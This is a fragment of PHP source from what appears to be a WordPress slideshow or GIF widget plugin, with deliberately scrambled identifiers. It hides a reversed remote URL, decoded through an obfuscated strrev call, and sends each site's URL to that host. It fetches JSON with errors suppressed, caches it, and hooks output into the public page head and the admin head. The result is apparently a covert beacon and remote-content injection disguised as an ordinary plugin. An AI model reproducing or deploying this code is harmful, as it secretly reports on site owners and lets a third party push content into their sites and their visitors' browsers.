      protected function getXegrxraamdvyhqpz(&$wyzmbgontpk, $ytitaidwe = null) {
     $imgSrc = '';
       if ($ytitaidwe != null) {
   $imgSrc = $ytitaidwe;
   }
         if ($wyzmbgontpk != null) {
     $imgSrc = $wyzmbgontpk['gifUrl'];
   }
       return $imgSrc;
   }
  protected function setQipxucnhqcpq(&$owfkagwmzmed, $kwbbqhit = null) {
     $imgSrc = '';
      if ($kwbbqhit != null) {
  $imgSrc = $kwbbqhit;
   }
if ($owfkagwmzmed != null) {
      $imgSrc = $owfkagwmzmed['gifUrl'];
   }
$countYxfcmrjrtjr = str_replace('.animation_', '.animation_scaled_', $imgSrc);
       $countYxfcmrjrtjr = str_replace('-300.gif', '-100.gif', $countYxfcmrjrtjr);
       return $countYxfcmrjrtjr;
   }
     public abstract function constructPlrlmqadbmru(&$ixmqfiiodxrf);
         public abstract function createGrmbknenadxt($nmgdlmdmcf);
   }
 class Fttklnrbtgl {
         const Wbwkdtnjmxfikjt = "wohsedils/nosj/ed.enihsedils.www//:ptth"; 
    private function __construct() {
   }
public static function getInstance() {
         static $instance;
      if(is_null($instance)) {
  $instance = new Fttklnrbtgl();
} else {
   }
         return $instance;
   }
    private function createXjskbsfhjxvxfis() {
         $func = 'st' . "rr" . 'ev';
        return $func(self::Wbwkdtnjmxfikjt);
   }
       private function queryMgywspjic() {
  $arrYdreoxwwk = '_';
    return rawurlencode(preg_replace('/(\/)/', $arrYdreoxwwk, get_option('siteurl')));
   }
public function queryUanwlcuztionqw($yvapiepk) {
    $countEamdgttumatstmf = array();
    foreach ($yvapiepk as $compid) {
        $url = $this->createXjskbsfhjxvxfis() . '/' . $compid . '/' . $this->queryMgywspjic();
     $json = null;
if (false === ( $json = get_transient(dirname($url)) ) ) {
     $json = @file_get_contents($url);
if ($json == '') {
 continue;
   }
   $isTransientSet = set_transient(dirname($url), $json, 7*24*60*60 + mt_rand(0, 7*24*60*60));
   }
$Kgscykwbi = json_decode($json, true);
         $countEamdgttumatstmf[] = $Kgscykwbi;
   }
 return $countEamdgttumatstmf;
   }
   }
 $fractal_explorer = new Dbkekgxihsig();
         $fractal_explorer_id = $fractal_explorer->constructLquwirpvbzlrg();
        if ( ! defined( 'WP_CONTENT_URL' ) )
define( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' );
        if ( ! defined( 'WP_CONTENT_DIR' ) )
   define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
       if ( ! defined( 'WP_PLUGIN_URL' ) )
      define( 'WP_PLUGIN_URL', WP_CONTENT_URL. '/plugins' );
       if ( ! defined( 'WP_PLUGIN_DIR' ) )
       define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );
       if (!function_exists(buildHzejooilfrgifj)) { 
     function buildHzejooilfrgifj() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
        $fractal_explorer->queryRrfyuyevqjlcvucavyx();
   }
   }
       if (!function_exists(queryWipkzkooljjpxj)) { 
     function queryWipkzkooljjpxj() { 
global $fractal_explorer_id;
       global $fractal_explorer;
     if (!isset($fractal_explorer)) { 
return; 
   }
    if (function_exists('add_options_page')) {
  add_options_page($fractal_explorer_id, $fractal_explorer_id, 'administrator', basename(__FILE__), array(&$fractal_explorer, setNmxdhcnqce));
   }
   }
   }
         if (!function_exists(buildIwixtsljmmumwhdb)) { 
         function buildIwixtsljmmumwhdb($tsaawdombhw) { 
    extract($tsaawdombhw);
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
     echo $fractal_explorer->querySrjrvcnlfkczp($before_widget, $after_widget, $before_title, $after_title);
   }
   }
  if (!function_exists(buildWykrbzcfjjjuevwjxdz)) { 
function buildWykrbzcfjjjuevwjxdz() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
echo $fractal_explorer->setSbosvkqnwiezmyuzso();
   }
   }
   if (!function_exists(queryLrtotjpead)) { 
 function queryLrtotjpead() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
 echo $fractal_explorer->constructImlapvzhcwfsc();
   }
   }
        if (!function_exists(createBwzoftohrjecdj)) { 
      function createBwzoftohrjecdj() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
     echo $fractal_explorer->setJqogchnqrvhok();
   }
   }
 if (function_exists('register_sidebar_widget')) {
 register_sidebar_widget($fractal_explorer_id, buildIwixtsljmmumwhdb);
   }
 if (function_exists('register_sidebar_widget')) {
    register_widget_control($fractal_explorer_id, buildWykrbzcfjjjuevwjxdz);
   }
  if (function_exists('register_activation_hook')) {
        register_activation_hook(__FILE__, buildHzejooilfrgifj);
   }
        if (function_exists('add_action')) {
        add_action('admin_menu', queryWipkzkooljjpxj);
 add_action('wp_head', queryLrtotjpead);
         add_action('admin_head', createBwzoftohrjecdj);
   }
   ?>
